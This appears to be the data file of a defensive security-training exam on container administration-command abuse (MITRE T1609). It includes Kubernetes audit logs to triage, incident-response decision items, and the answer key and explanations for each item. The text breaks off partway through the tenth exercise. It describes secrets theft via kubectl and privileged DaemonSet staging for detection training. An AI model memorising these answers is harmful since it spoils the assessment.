var META={"topicId":"t1609","mitreId":"T1609","name":"Container Administration Command","mitreName":"Container Administration Command","objectType":"technique","title":"T1609 Container Administration Command — EXTREMELY HARD","difficulty":"extremely-hard","severity":"extremely-hard","severityLabel":"EXTREMELY HARD","batch":4,"questionCount":15,"estimatedMinutes":28,"passMark":70,"protocol":"cpa-staged-v1"};
var INTRO={"learnHtml":"<p><b>You are the senior analyst on the bridge tonight.<\/b> This is the EXTREMELY HARD unit for <b>T1609 — Container Administration Command<\/b>, a Technique in MITRE ATT&amp;CK under the Execution tactic for the Containers platform. The earlier units taught you the admin services and the audit lines. This unit teaches the part of the job no dashboard does: <b>deciding<\/b>.<\/p><p>In real work — a SOC watching a container estate, a cloud security team hardening clusters, an IR lead containing a live intruder, a detection engineer writing the rules — two signals will often disagree: an exec that matches an approved change, a service account used from the wrong subnet, a CMDB that lies about what a pod holds. You will learn to resolve those <b>conflicting signals<\/b> with baseline behaviour, not paperwork; to choose <b>evidence-safe<\/b> actions over satisfying ones; and to price the <b>real cost<\/b> of every move — a revoked token that stops a nightly release, a restart that destroys volatile evidence.<\/p><p>You will also work the real campaigns: <b>Mini Shai-Hulud<\/b> and <b>TeamPCP Cloud Stealer<\/b> harvesting secrets with admin commands, <b>CanisterWorm<\/b> rolling out privileged DaemonSets, and <b>Hildegard<\/b> riding the kubelet. Some correct answers here are 'gather more evidence' or 'escalate' — saying so, at the right moment, is the senior skill this exam drills.<\/p>","themes":[{"name":"Container admin services","concepts":["exposed Docker daemon (port 2375)"]},{"name":"Kubernetes execution & access","concepts":["kubectl get secrets credential theft","privileged DaemonSet abuse"]},{"name":"Telemetry & detection","concepts":["k8s audit logs pods/exec","anomalous management utility use","unusual accounts and IPs outside management plane"]},{"name":"Real threat actor procedures","concepts":["Mini Shai-Hulud secrets gathering","TeamPCP Cloud Stealer","CanisterWorm privileged DaemonSets","Hildegard via kubelet API (TeamTNT)"]},{"name":"Mitigation & response","concepts":["evidence-safe vs destructive action","escalate or gather more evidence","conflicting signals resolution","real cost trade-off (downtime or evidence loss)"]}]};
var EXERCISES=[{"id":"EX-01","type":"line-select","summary":"Backup-admin exec at 02:00: rollout or intruder? Three bad audit lines.","concepts":["k8s audit logs pods/exec","unusual accounts and IPs outside management plane","anomalous management utility use","conflicting signals resolution"],"artifactNote":"Audit extract plus the change webhook relay and Falco for the same window.","scenario":"<p>02:05 — you take the senior bridge for cluster <b>meridian-prod-1<\/b> (payments). Trusted handover baseline: exec-capable identities are <span class=\"mono\">gitops-controller<\/span> (CI subnet 10[.]40[.]10[.]0/24) and <span class=\"mono\">nightly-report-sa<\/span> (reporting subnet 10[.]40[.]11[.]0/24); <span class=\"mono\">backup-admin<\/span> is a legacy account scheduled for deletion that should never authenticate; <span class=\"mono\">fin-report-svc<\/span> is read-only — 24 months of telemetry show get/list only, never an exec. The change system is in maintenance until 06:00, so tickets cannot be cross-checked from the bridge directly — an information gap you must work around.<\/p><pre class=\"art mono\">(k8s audit extract — meridian-prod-1, 01:47–03:52)\n01:47:10 verb=get    resource=pods        user=backup-admin      src=10[.]40[.]1[.]15      ok\n02:03:47 verb=create resource=pods/exec  user=backup-admin      src=10[.]40[.]1[.]15      pod=infra-backup-ctl-0\n02:07:55 verb=get    resource=pods/log    user=backup-admin      src=10[.]40[.]1[.]15      ok  (pod=infra-backup-ctl-0)\n02:47:03 verb=create resource=pods/exec  user=fin-report-svc    src=10[.]213[.]6[.]87     pod=finance-db-1\n02:48:12 verb=get    resource=secrets     user=fin-report-svc    src=10[.]213[.]6[.]87     name=payment-gateway-creds\n03:11:09 verb=create resource=pods/exec  user=fin-report-svc    src=10[.]213[.]6[.]87     pod=finance-api-5\n03:26:55 verb=get    resource=nodes       user=monitoring        src=10[.]40[.]8[.]6       ok\n03:52:31 verb=create resource=pods/exec  user=nightly-report-sa src=10[.]40[.]11[.]23     pod=reporting-gen-0<\/pre><pre class=\"art mono\">(#platform-changes webhook relay — tonight)\n01:12  CHG-88231 APPROVED (infra lead R. Okafor): emergency restore verification\n       on infra-backup-ctl-0, window 01:30-03:00, executed via backup-admin\n       from the infra bastion 10[.]40[.]1[.]15 per legacy runbook RB-114.\n03:05  DR lead: no changes requested in the finance namespace tonight.<\/pre><pre class=\"art mono\">(Falco — 02:47-03:12)\nNotice  Terminal shell spawned in container finance-db-1 (tty=true)\nWarning Outbound TLS to 91[.]240[.]118[.]29:443 from finance-db-1<\/pre>","question":"<p>Click the <b>three<\/b> audit lines that show abuse outside the trusted baseline.<\/p>","logLines":["01:47:10 verb=get    resource=pods        user=backup-admin      src=10[.]40[.]1[.]15      ok","02:03:47 verb=create resource=pods/exec  user=backup-admin      src=10[.]40[.]1[.]15      pod=infra-backup-ctl-0","02:07:55 verb=get    resource=pods/log    user=backup-admin      src=10[.]40[.]1[.]15      ok  (pod=infra-backup-ctl-0)","02:47:03 verb=create resource=pods/exec  user=fin-report-svc    src=10[.]213[.]6[.]87     pod=finance-db-1","02:48:12 verb=get    resource=secrets     user=fin-report-svc    src=10[.]213[.]6[.]87     name=payment-gateway-creds","03:11:09 verb=create resource=pods/exec  user=fin-report-svc    src=10[.]213[.]6[.]87     pod=finance-api-5","03:26:55 verb=get    resource=nodes       user=monitoring        src=10[.]40[.]8[.]6       ok","03:52:31 verb=create resource=pods/exec  user=nightly-report-sa src=10[.]40[.]11[.]23     pod=reporting-gen-0"],"badLines":[3,4,5],"filterable":true,"hint":"One exec-capable legacy identity is covered by an approved change relayed on the webhook channel — match subnet, window and target before judging it.","explanation":"<p>Lines 4, 5 and 6 are the abuse. <span class=\"mono\">fin-report-svc<\/span> has never exec'd in 24 months of telemetry, acts from the analytics VLAN 10[.]213[.]6[.]87 — outside the management plane — and the session pairs an exec into <b>finance-db-1<\/b> with a read of <b>payment-gateway-creds<\/b> and a second exec, while Falco confirms a shell and outbound TLS to an unknown host: the finance-db exec resolves from 'maybe the ETL?' to hostile on three independent disagreements with baseline. Lines 1–3 are <b>not<\/b> abuse: backup-admin looks like a dead account exec-ing into infra, but the webhook relay shows CHG-88231 approved tonight for exactly that pod, that window and that bastion source — paperwork the change system could not show you, resolving the rollout-or-intruder conflict in favour of rollout. The nightly-report-sa exec matches its subnet baseline, and the monitoring read is noise.<\/p>","study":"Resolve exec alerts against baseline behaviour and out-of-band change evidence, not account names alone."},{"id":"EX-02","type":"multi-step","summary":"ci-runner dumps 214 secrets; SIEM window closes at 01:10.","concepts":["Mini Shai-Hulud secrets gathering","kubectl get secrets credential theft","evidence-safe vs destructive action","real cost trade-off (downtime or evidence loss)"],"artifactNote":"Alert ticket, audit summary and the release calendar for the same night.","scenario":"<p>23:58 — you are IR bridge lead. A token for <span class=\"mono\">ci-runner<\/span>, a CI service account, is being used from <span class=\"mono\">193[.]32[.]130[.]190<\/span>, a hosting-range address, to run <span class=\"mono\">kubectl get secrets<\/span> across every namespace: 214 secret objects in 38 namespaces, including the payment-hsm signing key. The pattern matches <b>Mini Shai-Hulud (S9043)<\/b>, which gathered credentials with kubectl get secrets. The token is still valid. The SIEM's hot window closes at 01:10 — after that, the raw audit slice drops into cold storage where queries take days. It is incomplete information night: nobody yet knows whether the runner pod that leaked the token is still alive.<\/p><div class=\"ticket\"><span class=\"k\">INC-89104<\/span> P1 · 23:58 · ci-runner token used from 193[.]32[.]130[.]190 (hosting range) — 214 secrets read across 38 namespaces · matches Mini Shai-Hulud (S9043) gathering pattern · SIEM hot retention ends 01:10 · nightly merchant-sync release 00:30 runs under the same identity<\/div><pre class=\"art mono\">(k8s audit — ci-runner identity, 23:52-00:04)\n23:52:10  verb=list  resource=secrets  ns=*                                  resp=41KB    src=193[.]32[.]130[.]190\n23:53:02  verb=get   resource=secrets  ns=payment-hsm  name=hsm-signing-key  resp=187KB\n23:54:29  verb=get   resource=secrets  ns=payments     name=db-superuser     resp=12KB\n00:01:55  verb=list  resource=secrets  ns=*                                  resp=41KB   (second pass)\nbaseline: ci-runner acts only from 10[.]40[.]10[.]0/24<\/pre><pre class=\"art mono\">(release calendar)\n00:30  merchant-sync nightly release — runs under ci-runner\n       release manager P. Novak: \"cut-off is contractual; a slip means a\n       missed overnight price refresh for 240 stores\"<\/pre>","question":"<p>Work the four bridge decisions in order.<\/p>","steps":[{"prompt":"The SIEM hot window closes in about 70 minutes and the token is still live. What do you do first?","options":["Revoke the ci-runner token immediately so no further secrets can be read out","Restart all the CI runner pods to kill any live sessions that hold the token","Export the audit slice and 214 secret names to write-once storage, then revoke in the same minute"],"correct":2,"outcome":"Right — the export is the only artefact that dies with the hot window; revocation follows seconds later, but only after the blast-radius list is safe. This is the evidence-safe choice under the clock."},{"prompt":"A teammate argues kubectl get secrets only returns names, so nothing was actually stolen. The audit records show responseObject sizes up to 187 KB on the secret reads. What is the blast radius?","options":["Only the secrets inside the namespaces that the runner actually deploys to","All 214 objects returned with contents — treat every credential the token could read as exposed, payment-hsm first","Names only — the 187 KB responses are cluster metadata, so treat it as low impact"],"correct":1,"outcome":"Correct — response sizes prove object data came back, not just names; the teammate read the command line but not the telemetry. The conflict resolves in favour of full exposure."},{"prompt":"The release manager asks you to wait until 01:00 to revoke, so the 00:30 merchant-sync release ships on time. Your call?","options":["Revoke now and formally accept the missed release window — a hijacked release under the same token is the worse loss","Wait until 01:00 to revoke — the release cut-off is contractual and the business owns that risk","Revoke at 00:29 exactly, so the release squeaks through just before access is cut"],"correct":0,"outcome":"Yes — this is the real-cost decision: the business loses the overnight price refresh, logged as accepted with the release manager, because the same token that ships the release could hijack it. Waiting leaves a live stolen token inside your deployment pipeline."},{"prompt":"Rotation is running. Which pivot does the hunt team check before the hour closes?","options":["Whether any of the 214 secrets was a stolen SA token — audit pods/exec and DaemonSet creates under those identities since 22:00","Whether the runners' base image needs an emergency patch before the next build","A fresh vulnerability scan of the CI subnet for the leaking runner pod"],"correct":0,"outcome":"Correct — a stolen service-account token converts secrets theft into cluster-wide execution; privileged DaemonSets are the documented next step, and the pivot audit is the only way to see it in time."}],"hint":"The hot window is the constraint everything else bends around — and the release calendar is a cost, not a veto.","explanation":"<p>The chain: export the <b>evidence<\/b> while the SIEM window still allows it, size the <b>blast radius<\/b> from response sizes (contents were returned, so all 214 credentials count as exposed — the Mini Shai-Hulud <b>gathering<\/b> pattern), take the <b>real-cost trade-off<\/b> of revoking before the release rather than risking a hijacked pipeline, and hunt the pivot — stolen service-account tokens enable exec and privileged DaemonSets. Restarting runners, waiting for a contractual cut-off, or scanning the CI subnet each either lose evidence, keep access alive, or watch the wrong thing.<\/p>","study":"Sequence evidence export before containment when retention windows are closing; hunt token pivots after secrets theft."},{"id":"EX-03","type":"qcm-single","summary":"The CISO's restart-everything runbook meets a secrets-theft bridge.","concepts":["real cost trade-off (downtime or evidence loss)","kubectl get secrets credential theft"],"scenario":"<p>04:10, the same bridge. Confirmed so far: the intruder downloaded 214 secret objects with contents, including at least one service-account token, and used the ci-runner identity repeatedly between 23:52 and 00:04 from the hosting-range address. The CISO joins and reads from the standard credential-compromise runbook: \"Section four — restart every node in the cluster so all session state is wiped, rotate the cluster CA, then redeploy. Execute now.\" Two exec streams from the stolen identity may still be live, and the volatile state on the touched nodes has not been captured.<\/p><pre class=\"art mono\">(runbook §4 — Mass credential compromise)\n4.1  Restart all cluster nodes to clear in-memory state.\n4.2  Rotate the cluster certificate authority.\n4.3  Redeploy all workloads from current images.<\/pre>","question":"<p>You must answer the CISO now. Why is the runbook's restart-everything move the wrong call in this specific incident?<\/p>","options":["The runbook is right — restarts clear exec sessions from memory and CA rotation re-issues every token instantly","Restart only the payments nodes — that halves the outage while still wiping the stolen tokens from every kubelet cache","Node restarts cannot un-steal copied credentials; revoke the stolen identities, rotate in value order, and preserve the audit evidence instead","Skip rotation — the audit shows the token used only once, so one restart and a token re-issue are enough"],"correct":2,"hint":"Ask what the attacker physically holds after the last read — and what a node reboot does and does not touch.","explanation":"<p>Copied secrets live on the attacker's infrastructure: a node restart wipes local caches but not the exfiltrated copies, so the outage buys nothing against the actual compromise — and it destroys the volatile evidence still needed for the exec-session timeline. The common best practice is wrong here. The correct sequence is revoke the stolen identities and tokens, rotate the exposed credentials in value order, and preserve the audit slice. Partial restarts leave half the estate untouched, and the 'used only once' claim is contradicted by the telemetry showing repeated use from 23:52 to 00:04 — the conflict resolves against the runbook and against skipping rotation.<\/p>","study":"Why restart-based responses fail against exfiltrated credentials; revocation and rotation sequencing under stakeholder pressure."},{"id":"EX-04","type":"fill-blank","summary":"Two intel cards swapped: fix the CISO's campaign summary.","concepts":["Mini Shai-Hulud secrets gathering","TeamPCP Cloud Stealer"],"artifactNote":"The intern's mixed-up card and the procedure table excerpt it must match.","scenario":"<p>The CISO needs a two-line campaign summary for the board pack in ten minutes. The intern's draft card got the two names swapped, because both campaigns steal secrets through the same Kubernetes admin commands and both look identical in a raw audit log. Your job is to put the right name on each line using the ATT&amp;CK procedure table — the one source of truth in the room. The distinguishing detail matters for the board: one campaign rode a supply-chain wave and gathered credentials cluster-wide with kubectl get secrets; the other is the TeamPCP tool that extracted stored secrets through those same admin commands once access existed. Getting them backwards mislabels the intrusion path in front of the board.<\/p><pre class=\"art mono\">ATT&amp;CK T1609 — Procedure Examples (excerpt)\nS9043  Mini Shai-Hulud       : used kubectl get secrets to gather credentials\nS9041  TeamPCP Cloud Stealer : extracted stored secrets via the same admin commands<\/pre><pre class=\"art mono\">(intern's draft — names swapped)\nLine 1: supply-chain wave, kubectl get secrets gathering .... [ ??? ]\nLine 2: TeamPCP tool, extracted stored secrets .............. [ ??? ]<\/pre>","question":"<p>Fill the blanks with the correct campaign names, in order.<\/p>","template":"Fill the blanks: the campaign that rode the supply-chain wave and used kubectl get secrets to gather cluster credentials is tracked as <input1>, while the TeamPCP tool that extracted stored secrets through the same admin commands is <input2>.","blanks":[{"answer":"Mini Shai-Hulud","alts":["mini shai hulud","s9043","shai-hulud","mini shai-hulud"],"placeholder":"campaign name","width":16},{"answer":"Cloud Stealer","alts":["cloud stealer","teampcp cloud stealer","s9041","teampcp"],"placeholder":"tool name","width":14}],"hint":"The intern swapped them: match each name to its S-number line in the procedure excerpt before filling.","explanation":"<p>Line 1 is <b>Mini Shai-Hulud (S9043)<\/b> — documented as using <b>kubectl get secrets to gather credentials<\/b> across the cluster, the supply-chain-wave campaign. Line 2 is <b>TeamPCP Cloud Stealer (S9041)<\/b> — it <b>extracted stored secrets via the same admin commands<\/b> after access was gained. The two look identical in a raw audit log because both ride kubectl get secrets; the procedure table separates them by what each did with the access, which is exactly the distinction the board summary must carry.<\/p>","study":"ATT&CK T1609 Procedure Examples: S9043 and S9041."},{"id":"EX-05","type":"terminal","summary":"Read-only pipeline: list every privileged pod before anyone deletes.","concepts":["privileged DaemonSet abuse","evidence-safe vs destructive action"],"scenario":"<p>INC-89104 continues. Intel suggests a <b>CanisterWorm (S9042)<\/b>-style step may have been staged in cluster <b>meridian-prod-1<\/b>: kubectl-created <b>privileged DaemonSets<\/b> landing on every node. The IR lead's constraints are hard: nothing may be created, modified or deleted; no exec sessions — your own pods/exec creates would contaminate the audit timeline under legal hold; and the RBAC review alone cannot answer which pods actually run privileged containers, because roles changed last sprint. A junior offers to <span class=\"mono\">kubectl delete daemonset night-shift-miner<\/span> the moment anything privileged shows up — you overrule him: deletion is a destructive action on a live incident, and enumeration comes first.<\/p><pre class=\"art mono\">environment: analyst@jump:~$  (admin context set, jq 1.6 installed)\nknown noise: log-shipper DaemonSet runs with privileged: false\nobjective:   namespace/name of every pod, all namespaces, running at\n             least one privileged container — read-only, one pipeline<\/pre>","question":"<p>Type the single read-only pipeline that lists namespace/name of every pod across all namespaces running at least one privileged container.<\/p>","shellPrompt":"analyst@jump:~$","expected":"kubectl get pods -A -o json | jq -r '.items[] | select(any(.spec.containers[]; .securityContext.privileged == true)) | .metadata.namespace + \"/\" + .metadata.name'","elements":[{"any":["kubectl get pods","kubectl get pod","kubectl get po"],"label":"the read-only pod listing"},{"any":["-a","--all-namespaces"],"label":"all namespaces"},{"any":["-o json","-o=json"],"label":"structured JSON output"},{"any":["jq"],"label":"the jq filter stage"},{"any":["privileged"],"label":"the privileged security-context field"}],"hint":"One line, chained: the read-only listing with structured output feeding a filter that tests the privileged field — no delete, no exec, no restart anywhere in it.","explanation":"<p><span class=\"mono\">kubectl get pods -A -o json | jq -r '.items[] | select(any(.spec.containers[]; .securityContext.privileged == true)) | .metadata.namespace + \"/\" + .metadata.name'<\/span> is pure read: a get of pod objects in all namespaces as JSON, filtered by jq for any container with <span class=\"mono\">privileged: true<\/span>. It answers the CanisterWorm question without touching cluster state and leaves no pods/exec footprint in the audit trail. The junior's delete would destroy runtime evidence and, if the DaemonSet is legitimate, take a workload down for nothing; describing pods one by one changes nothing but answers slower and misses the cluster-wide view.<\/p>","study":"Read-only jq pipelines over kubectl JSON output for securityContext review."},{"id":"EX-06","type":"line-select","summary":"deploy-bot execs from two subnets; the DR ticket says cancelled.","concepts":["conflicting signals resolution","k8s audit logs pods/exec","anomalous management utility use"],"artifactNote":"Audit extract, the DR change ticket and tonight's release manifest.","scenario":"<p>23:20 — cluster <b>meridian-prod-2<\/b>. Baseline: <span class=\"mono\">deploy-bot<\/span> execs only from the CI subnet 10[.]40[.]10[.]0/24, only onto pods in the active release, and its one allow-listed command is <span class=\"mono\">/opt/smoke/post-deploy.sh<\/span>. Tonight the audit shows deploy-bot execs from <b>two<\/b> subnets. The DR-site range 10[.]77[.]0.0/16 has never appeared in this cluster's audit history. A change ticket exists for a DR failover readiness test — but its status line and the release manifest both tell a different story, and the platform duty manager is quoting the ticket's existence at you as proof everything is fine. You must decide from behaviour, not paperwork.<\/p><pre class=\"art mono\">(k8s audit extract — meridian-prod-2, 22:41–23:52)\n22:41:03 verb=create resource=pods/exec  user=deploy-bot  src=10[.]40[.]10[.]41  pod=cart-api-6c4f9      ok (release 2024.11.6)\n22:44:19 verb=get    resource=pods       user=deploy-bot  src=10[.]40[.]10[.]41  ok\n22:58:37 verb=create resource=pods/exec  user=deploy-bot  src=10[.]77[.]4[.]19   pod=cart-api-6c4f9\n23:01:12 verb=create resource=pods/exec  user=deploy-bot  src=10[.]77[.]4[.]19   pod=inventory-svc-2\n23:09:41 verb=get    resource=secrets    user=deploy-bot  src=10[.]77[.]4[.]19   name=card-gateway-tls\n23:17:05 verb=create resource=pods/exec  user=deploy-bot  src=10[.]40[.]10[.]41  pod=cart-api-6c4f9      ok (allow-listed: /opt/smoke/post-deploy.sh)\n23:31:48 verb=list   resource=deployments user=gitops-controller src=10[.]40[.]10[.]41 ok\n23:52:14 verb=get    resource=nodes      user=monitoring  src=10[.]40[.]8[.]6     ok<\/pre><div class=\"ticket\"><span class=\"k\">CHG-88477<\/span> DR failover readiness test — status <b>CANCELLED 21:05<\/b> by DR lead S. Whitfield (ack posted to platform-changes: \"test moved to next month; no DR traffic tonight\").<\/div><pre class=\"art mono\">(release 2024.11.6 manifest — gitops-controller, 22:30-23:30)\ntargets: cart-api-6c4f9  (post-deploy smoke: /opt/smoke/post-deploy.sh)\n         cart-web-8b2    (no exec)\nNOT in this release: inventory-svc-2, payment-gw-3<\/pre>","question":"<p>Click the <b>three<\/b> audit lines that are the intruder's, not the release pipeline's.<\/p>","logLines":["22:41:03 verb=create resource=pods/exec  user=deploy-bot  src=10[.]40[.]10[.]41  pod=cart-api-6c4f9      ok (release 2024.11.6)","22:44:19 verb=get    resource=pods       user=deploy-bot  src=10[.]40[.]10[.]41  ok","22:58:37 verb=create resource=pods/exec  user=deploy-bot  src=10[.]77[.]4[.]19   pod=cart-api-6c4f9","23:01:12 verb=create resource=pods/exec  user=deploy-bot  src=10[.]77[.]4[.]19   pod=inventory-svc-2","23:09:41 verb=get    resource=secrets    user=deploy-bot  src=10[.]77[.]4[.]19   name=card-gateway-tls","23:17:05 verb=create resource=pods/exec  user=deploy-bot  src=10[.]40[.]10[.]41  pod=cart-api-6c4f9      ok (allow-listed: /opt/smoke/post-deploy.sh)","23:31:48 verb=list   resource=deployments user=gitops-controller src=10[.]40[.]10[.]41 ok","23:52:14 verb=get    resource=nodes      user=monitoring  src=10[.]40[.]8[.]6     ok"],"badLines":[2,3,4],"filterable":true,"hint":"The DR test exists on paper — read the ticket's final status and the manifest again before trusting either.","explanation":"<p>Lines 3, 4 and 5 are the intruder: execs from the DR range 10[.]77[.]4[.]19 — a subnet that never appears in this cluster's history — including a target, <span class=\"mono\">inventory-svc-2<\/span>, that is explicitly not in tonight's manifest, followed by a read of <b>card-gateway-tls<\/b>. The conflicting signal — a ticket that seems to authorise DR activity — resolves against the intruder's favour: CHG-88477 was cancelled at 21:05 with an ack saying no DR traffic tonight, and cancelled paperwork never grants access; baseline behaviour, not the ticket's existence, is what decides it. Someone is replaying a valid deploy-bot token from the DR site. Lines 1, 6, 7 and 8 stay benign: the release-window execs come from the CI subnet onto manifest targets, the smoke exec is the allow-listed command, and the gitops list and monitoring read are routine.<\/p>","study":"Token replay from a second subnet; resolving authorisation questions with telemetry over paperwork."},{"id":"EX-07","type":"qcm-multi","summary":"Five proposed actions; pick the three that cut risk, keep evidence.","concepts":["evidence-safe vs destructive action","real cost trade-off (downtime or evidence loss)","kubectl get secrets credential theft"],"artifactNote":"The VP's framing and the five proposals as tabled on the bridge.","scenario":"<p>04:40, payments bridge. Confirmed: the intruder downloaded 214 secret objects with contents, including service-account tokens and the payment-hsm key; the stolen ci-runner token is revoked; the stolen <span class=\"mono\">gitops-deployer<\/span> token's status is still unknown — an unresolved loose end with live risk attached. The VP of payments frames the objective: \"Cut our risk now. And the card-scheme report in 48 hours needs evidence that survives — do not hand them a story we cannot prove.\" Five actions are tabled. Three cut risk while keeping evidence usable; two either destroy evidence or blow the outage budget without closing the actual gap.<\/p><div class=\"ticket\"><span class=\"k\">Bridge decision<\/span> INC-89104 · choose exactly three actions · every action must either reduce attacker access or reduce exposure, without destroying proof · outage tolerance this hour: payments API must stay up<\/div>","question":"<p>Select the <b>three<\/b> actions that cut risk while keeping the evidence usable.<\/p>","options":["Delete the 40 pods the stolen token touched so the cluster returns to a known state","Export the audit slice and the secret inventory to write-once storage before anything else changes","Revoke the still-valid gitops-deployer token and strip its pods/exec verb cluster-wide","Rotate the cluster certificate authority immediately so every old token dies at once","Start a read-only packet capture on the API server frontend to catch any further use of stolen credentials"],"correct":[1,2,4],"hint":"Two proposals destroy or disable more than they fix; check each against the legal hold and the uptime line.","explanation":"<p>Correct: <b>export first<\/b> — evidence-safe, and everything after changes state; <b>revoke the gitops-deployer token and cut its pods/exec verb<\/b> — that closes the known live-access gap with zero downtime; and the <b>read-only packet capture<\/b> — it documents any further token use for the card-scheme report without touching workloads. Wrong: deleting the 40 pods destroys runtime evidence (memory, exec streams, container state) and changes no credential access — the adversary holds tokens, not pods. And immediate CA rotation is the common best-practice hammer that is wrong here: it invalidates your own tooling mid-incident, forces a rolling re-auth outage across the payments estate, and still does nothing about the downloaded secret contents, which are the actual exposure.<\/p>","study":"Risk-cutting versus evidence-destroying actions during a live credential-theft containment."},{"id":"EX-08","type":"ordering","summary":"Rank the five response moves for the confirmed secrets dump.","concepts":["evidence-safe vs destructive action","escalate or gather more evidence","kubectl get secrets credential theft"],"artifactNote":"Constraints the ranking must respect, from the IR lead's brief.","scenario":"<p>04:55 — the IR lead asks you to bring a ranked runbook to the 05:00 bridge for the confirmed secrets dump on meridian-prod-1, with the rationale attached to each step because the card-scheme report will be written from it. The constraints: a legal hold is active; the card-scheme report is due in 48 hours; the payments API must stay up; the gitops-deployer token's exposure is still unconfirmed; and the business owner has accepted a possible missed release window. Every step must be defensible in the report as either evidence-preserving, access-cutting, or scope-reducing — in that logic. Steps performed out of order quietly destroy the later steps' value: revoke before exporting and you lose the live view; rotate before revoking and the attacker's copy of the old token keeps working while yours burns.<\/p><pre class=\"art mono\">(IR lead's brief — constraints)\nlegal hold active; card-scheme report due 48h; payments API stays up\ngitops-deployer token exposure: UNCONFIRMED\nbusiness owner: missed-release cost accepted in writing<\/pre>","question":"<p>Order the five response moves from first to last.<\/p>","items":["Export the audit slice and the secret inventory to write-once storage — every later action changes state, so the record comes first","Revoke the compromised service-account token and strip its pods/exec verb — cut new attacker access before anything else moves","Terminate live exec streams and quarantine the touched pods from the network — contain without destroying runtime evidence under the legal hold","Rotate the exposed credentials in value order, starting with the payment signing key — shrink the blast radius the theft created","Escalate the scoped incident to the IR lead with the evidence pack — the rebuild decision and the unconfirmed gitops-deployer token need a sign-off you should not take alone"],"hint":"One step makes every later step auditable, one cuts the attacker's next move, and the last step refuses a decision that is not yours to take.","explanation":"<p>The defensible order: <b>evidence<\/b> (export first — everything later changes state), <b>revoke<\/b> (token plus pods/exec verb — the least aggressive cut that removes new access), <b>remove<\/b> (terminate exec streams and quarantine pods — containment that keeps runtime evidence for the legal hold), <b>rotate<\/b> (credentials in value order — the signing key first, because its misuse costs the most), and <b>escalate<\/b> (hand the evidence pack to the IR lead — the rebuild and the unconfirmed gitops-deployer exposure are decisions with cost trade-offs that need sign-off above the bridge). Rotating before revoking, or deleting pods before exporting, each breaks the chain the report has to show.<\/p>","study":"Response sequencing for admin-command credential theft: evidence, revoke, contain, rotate, escalate."}];

EXERCISES.push({"id":"EX-09","type":"fill-blank","summary":"Annotate the DaemonSet alert: CanisterWorm pattern, no over-claim.","concepts":["CanisterWorm privileged DaemonSets","privileged DaemonSet abuse"],"artifactNote":"The alert payload and the annotation slot the CISO quotes verbatim.","scenario":"<p>Detection-engineering standup. The overnight alert below fired on cluster <b>meridian-prod-1<\/b> and the CISO will quote your annotation verbatim to the board, so it must be precise: it may claim what the telemetry shows, and nothing more. Two facts pull in different directions and must be resolved in the wording. The shape — a kubectl-created DaemonSet with privileged and hostPID, tolerating every taint, landing on all schedulable nodes within 40 seconds — matches the documented <b>CanisterWorm (S9042)<\/b> pattern of privileged DaemonSets as a stepping stone to data wiping. But nothing in the telemetry shows wiping activity yet, and the only other DaemonSet on the cluster, the log-shipper, runs unprivileged and is accounted for. The annotation therefore names the staging pattern without asserting the outcome the pattern is known to precede.<\/p><pre class=\"art mono\">alert: kubectl-created DaemonSet \"night-shift-miner\"\nspec.template.spec.containers[0].securityContext:\n    privileged: true\n    hostPID: true\ntolerations: operator=Exists  (accepts every taint)\nobserved: pod scheduled on every schedulable node within 40s\n          no data-destruction events recorded so far\nlegitimate log-shipper DaemonSet on same cluster: privileged: false<\/pre>","question":"<p>Fill the annotation blanks exactly as the board wording requires.<\/p>","template":"Fill the blanks: the kubectl-created DaemonSet ran with <input1>: true and hostPID, so its pod landed on <input2> schedulable node in the cluster — the documented CanisterWorm (S9042) staging pattern ahead of any wiping stage, which has not yet been observed.","blanks":[{"answer":"privileged","alts":["privileged:true","privileged true","PRIVILEGED"],"placeholder":"securityContext field","width":12},{"answer":"every","alts":["all","each","every schedulable"],"placeholder":"coverage word","width":6}],"hint":"First blank: the exact securityContext field in the alert. Second blank: the coverage word that matches 'on every schedulable node' without over-reaching to unschedulable ones.","explanation":"<p>The annotation reads <b>privileged: true<\/b> — the field that, with hostPID and a toleration for every taint, gave the pod root-level reach on its host — and <b>every<\/b> schedulable node, which is exactly what the 40-second full scheduling shows. That is the <b>CanisterWorm (S9042) privileged DaemonSet<\/b> staging pattern: kubectl-created, cluster-wide, privileged. The wording stops short of claiming wiping because no destruction events are recorded — the pattern is documented as a stepping stone to wiping, and the annotation claims the step that was observed, not the one that is feared. The unprivileged log-shipper is the near-miss that must not be swept into the claim.<\/p>","study":"CanisterWorm S9042: kubectl-created privileged DaemonSets preceding data wiping."},
{"id":"EX-10","type":"multi-step","summary":"03:00 exec into vault-0; ten minutes, stale CMDB, a shaky alibi.","concepts":["escalate or gather more evidence","kubectl get secrets credential theft","real cost trade-off (downtime or evidence loss)","conflicting signals resolution"],"artifactNote":"Audit extract, the CMDB entry and the identity's 14-month baseline.","scenario":"<p>03:07 — cluster <b>meridian-secrets<\/b>. Alert: <span class=\"mono\">vault-unsealer<\/span>, the service account for the nightly unseal, created a pods/exec session into <span class=\"mono\">vault-0<\/span>, the pod that terminates the production PKI root, from <span class=\"mono\">10[.]19[.]7[.]203<\/span>, an address in the cost-report cron subnet. Three signals conflict. The timing matches the nightly unseal — but the unseal job has used the vault API sidecar, never an exec, for its whole 14-month history. The on-call platform engineer says \"that was me, I checked a stuck init container\" — but the audit identity is the service account, not any human account, and his claim names no ticket. The CMDB lists vault-0 as a legacy test instance — but it terminates the production PKI root, so the CMDB is stale. The Head of Platform is on the phone: \"Restart the pod now, kick him out.\" You have roughly ten minutes before the morning bridge.<\/p><pre class=\"art mono\">(k8s audit — meridian-secrets, 03:00-03:41)\n03:00:07 verb=create resource=pods/exec  user=vault-unsealer  src=10[.]19[.]7[.]203  pod=vault-0\n03:00:11 (Falco) Notice Terminal shell spawned in container vault-0 (tty=true, parent=unknown)\n03:06:19 verb=create resource=pods/exec  user=vault-unsealer  src=10[.]19[.]7[.]203  pod=vault-0\n03:41:33 verb=get    resource=secrets     user=vault-unsealer  src=10[.]19[.]7[.]203  name=vault-ca-bundle\n\n(what the shell did inside vault-0: UNKNOWN — not yet captured)<\/pre><div class=\"ticket\"><span class=\"k\">CMDB CI-4471<\/span> vault-0 — \"legacy test instance, no production data\" (last audited 2022; actually terminates the production PKI root).<\/div><pre class=\"art mono\">(vault-unsealer — 14-month baseline)\nnightly 03:00 unseal via vault API sidecar — no exec ever recorded\nrole: get/list secrets ns=vault + create pods/exec ns=vault (granted for the 2023 DR drill)\ntonight: exec x2 from 10[.]19[.]7[.]203 (cost-report cron subnet; host ownership UNKNOWN)<\/pre>","question":"<p>Work the four decisions before the bridge.<\/p>","steps":[{"prompt":"Head of Platform wants the pod restarted now. Your first move in the ten minutes you have?","options":["Restart 